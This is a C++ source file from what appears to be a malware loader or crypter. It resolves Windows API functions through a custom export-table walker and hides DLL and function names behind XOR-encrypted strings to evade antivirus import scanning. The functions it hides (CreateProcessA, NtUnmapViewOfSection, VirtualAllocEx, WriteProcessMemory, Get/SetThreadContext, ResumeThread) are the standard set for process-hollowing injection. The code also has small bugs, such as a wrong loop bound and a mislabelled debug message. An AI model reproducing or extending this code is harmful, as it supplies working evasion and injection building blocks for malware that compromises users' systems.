#include "hiddenImports.h"


PVOID WINAPI GetFunctionAddress(LPCTSTR lpDllName, LPCSTR lpFunctionName) {
    PPE_HEADERS ppehModuleHeaders;
    HMODULE hModule;
    PDWORD pdwAddress, pdwName;
    PWORD pwOrdinal;

    hModule = GetModuleHandle(lpDllName);

    if (!hModule)
        hModule = LoadLibrary(lpDllName);
    if(!hModule)
        return nullptr;

    ppehModuleHeaders = LoadPEHeaders((VIRTUAL_ADDRESS)hModule);
    if(ppehModuleHeaders->NTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0)
        return nullptr;

    auto pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)hModule + ppehModuleHeaders->NTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    pdwAddress = (PDWORD)((LPBYTE)hModule + pExportDirectory->AddressOfFunctions);
    pdwName = (PDWORD)((LPBYTE)hModule + pExportDirectory->AddressOfNames);

    pwOrdinal = (PWORD)((LPBYTE)hModule + pExportDirectory->AddressOfNameOrdinals);

    for(int i=0; i < pExportDirectory->AddressOfFunctions; i++) {
        if(!strcmp(lpFunctionName, (char*)hModule + pdwName[i])) {
            return (PVOID)((LPBYTE)hModule + pdwAddress[pwOrdinal[i]]);
        }
    }
    return nullptr;
}

PVOID WINAPI GetKernel32Function(LPCSTR lpFunctionName) {
    char encryptedKernel32[] = "\x84\x84\xc6\x93\x47\x2f\xb0\xb1\x7c\x6a\xad\x83";
    Xor(encryptedKernel32, 12, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    return GetFunctionAddress((LPCSTR)encryptedKernel32, lpFunctionName);
}

PVOID WINAPI GetNtDllFunction(LPCSTR lpFunctionName) {
    char encryptedNtDll[] = "\x81\x95\xd0\x91\x4e\x6d\xe7\xef\x3e";
    Xor(encryptedNtDll, 9, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    return GetFunctionAddress((LPCSTR)encryptedNtDll, lpFunctionName);
}

_CreateProcessA GetHiddenCreateProcessA() {
    DebugInfoMessage("Getting address of CreateProcessA");
    char encryptedCreateProcessA[] = "\xac\x93\xd1\x9c\x56\x26\xd3\xf1\x3d\x6d\xa4\x9c\x92\xf5";
    Xor(encryptedCreateProcessA, 14, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    auto HiddenCreateProcessA = (_CreateProcessA)GetKernel32Function((LPCSTR)encryptedCreateProcessA);
    if (!HiddenCreateProcessA) {
        DebugErrorMessage("Failed to get address of CreateProcessA");
    } else {
        DebugData("Address of VirtualProtectEx", (VIRTUAL_ADDRESS) HiddenCreateProcessA, FORMAT_ADDRESS);
    }
    return HiddenCreateProcessA;
}

_NtUnmapViewOfSection GetHiddenNtUnmapViewOfSection() {
    DebugInfoMessage("Getting address of NtUnmapViewOfSection");
    char encryptedNtUnmapViewOfSection[] = "\xa1\x95\xe1\x93\x4f\x22\xf3\xd5\x3b\x6b\xb6\xa0\x87\xe7\x98\x41\x37\xea\xec\x3c";
    Xor(encryptedNtUnmapViewOfSection, 20, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    auto HiddenNtUnmapViewOfSection = (_NtUnmapViewOfSection) GetNtDllFunction((LPCSTR)encryptedNtUnmapViewOfSection);
    if (!HiddenNtUnmapViewOfSection) {
        DebugErrorMessage("Failed to get address of NtUnmapViewOfSection");
    } else {
        DebugData("Address of NtUnmapViewOfSection", (VIRTUAL_ADDRESS) HiddenNtUnmapViewOfSection, FORMAT_ADDRESS);
    }
    return HiddenNtUnmapViewOfSection;
}

_VirtualAllocEx GetHiddenVirtualAllocEx() {
    DebugInfoMessage("Getting address of VirtualAllocEx");
    char encryptedVirtualAllocEx[] = "\xb9\x88\xc6\x89\x57\x22\xef\xc2\x3e\x62\xae\x8c\xa4\xcc";
    Xor(encryptedVirtualAllocEx, 14, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    auto HiddenVirtualAllocEx = (_VirtualAllocEx)GetKernel32Function((LPCSTR)encryptedVirtualAllocEx);
    if (!HiddenVirtualAllocEx) {
        DebugErrorMessage("Failed to get address of VirtualAllocEx");
    } else {
        DebugData("Address of VirtualAllocEx", (VIRTUAL_ADDRESS) HiddenVirtualAllocEx, FORMAT_ADDRESS);
    }
    return HiddenVirtualAllocEx;
}

_WriteProcessMemory GetHiddenWriteProcessMemory() {
    DebugInfoMessage("Getting address of WriteProcessMemory");
    char encryptedWriteProcessMemory[] = "\xb8\x93\xdd\x89\x47\x13\xf1\xec\x31\x6b\xb2\x9c\xac\xd1\x90\x4d\x31\xfa";
    Xor(encryptedWriteProcessMemory, 18, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    auto HiddenWriteProcessMemory = (_WriteProcessMemory)GetKernel32Function((LPCSTR)encryptedWriteProcessMemory);
    if (!HiddenWriteProcessMemory) {
        DebugErrorMessage("Failed to get address of WriteProcessMemory");
    } else {
        DebugData("Address of WriteProcessMemory", (VIRTUAL_ADDRESS) HiddenWriteProcessMemory, FORMAT_ADDRESS);
    }
    return HiddenWriteProcessMemory;
}

_VirtualProtectEx GetHiddenVirtualProtectEx() {
    DebugInfoMessage("Getting address of VirtualProtectEx");
    char encryptedVirtualProtectEx[] = "\xb9\x88\xc6\x89\x57\x22\xef\xd3\x20\x61\xb5\x8a\x82\xc0\xb8\x5a";
    Xor(encryptedVirtualProtectEx, 16, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    auto HiddenVirtualProtectEx = (_VirtualProtectEx)GetKernel32Function((LPCSTR)encryptedVirtualProtectEx);
    if (!HiddenVirtualProtectEx) {
        DebugErrorMessage("Failed to get address of VirtualProtectEx");
    } else {
        DebugData("Address of VirtualProtectEx", (VIRTUAL_ADDRESS) HiddenVirtualProtectEx, FORMAT_ADDRESS);
    }
    return HiddenVirtualProtectEx;
}

_GetThreadContext GetHiddenGetThreadContext() {
    DebugInfoMessage("Getting address of GetThreadContext");
    char encryptedGetThreadContext[] = "\xa8\x84\xc0\xa9\x4a\x31\xe6\xe2\x36\x4d\xae\x81\x95\xd1\x85\x56";
    Xor(encryptedGetThreadContext, 16, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    auto HiddenGetThreadContext = (_GetThreadContext)GetKernel32Function((LPCSTR)encryptedGetThreadContext);
    if (!HiddenGetThreadContext) {
        DebugErrorMessage("Failed to get address of GetThreadContext");
    } else {
        DebugData("Address of GetThreadContext", (VIRTUAL_ADDRESS) HiddenGetThreadContext, FORMAT_ADDRESS);
    }
    return HiddenGetThreadContext;
}

_SetThreadContext GetHiddenSetThreadContext() {
    DebugInfoMessage("Getting address of SetThreadContext");
    char encryptedSetThreadContext[] = "\xbc\x84\xc0\xa9\x4a\x31\xe6\xe2\x36\x4d\xae\x81\x95\xd1\x85\x56";
    Xor(encryptedSetThreadContext, 16, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    auto HiddenSetThreadContext = (_SetThreadContext)GetKernel32Function((LPCSTR)encryptedSetThreadContext);
    if (!HiddenSetThreadContext) {
        DebugErrorMessage("Failed to get address of SetThreadContext");
    } else {
        DebugData("Address of SetThreadContext", (VIRTUAL_ADDRESS) HiddenSetThreadContext, FORMAT_ADDRESS);
    }
    return HiddenSetThreadContext;
}

_ResumeThread GetHiddenResumeThread() {
    DebugInfoMessage("Getting address of ResumeThread");
    char encryptedResumeThread[] = "\xbd\x84\xc7\x88\x4f\x26\xd7\xeb\x20\x6b\xa0\x8b";
    Xor(encryptedResumeThread, 12, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    auto HiddenResumeThread = (_ResumeThread)GetKernel32Function((LPCSTR)encryptedResumeThread);
    if (!HiddenResumeThread) {
        DebugErrorMessage("Failed to get address of ResumeThread");
    } else {
        DebugData("Address of ResumeThread", (VIRTUAL_ADDRESS) HiddenResumeThread, FORMAT_ADDRESS);
    }
    return HiddenResumeThread;
}

_ReadProcessMemory GetReadProcessMemory() {
    DebugInfoMessage("Getting address of ReadProcessMemory");
    char encryptedReadProcessMemory[] = "\xbd\x84\xd5\x99\x72\x31\xec\xe0\x37\x7d\xb2\xa2\x84\xd9\x92\x50\x3a";
    Xor(encryptedReadProcessMemory, 17, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    auto ReadProcessMemory = (_ReadProcessMemory)GetKernel32Function((LPCSTR)encryptedReadProcessMemory);
    if (!ReadProcessMemory) {
        DebugErrorMessage("Failed to get address of ReadProcessMemory");
    } else {
        DebugData("Address of ReadProcessMemory", (VIRTUAL_ADDRESS) ReadProcessMemory, FORMAT_ADDRESS);
    }
    return ReadProcessMemory;
}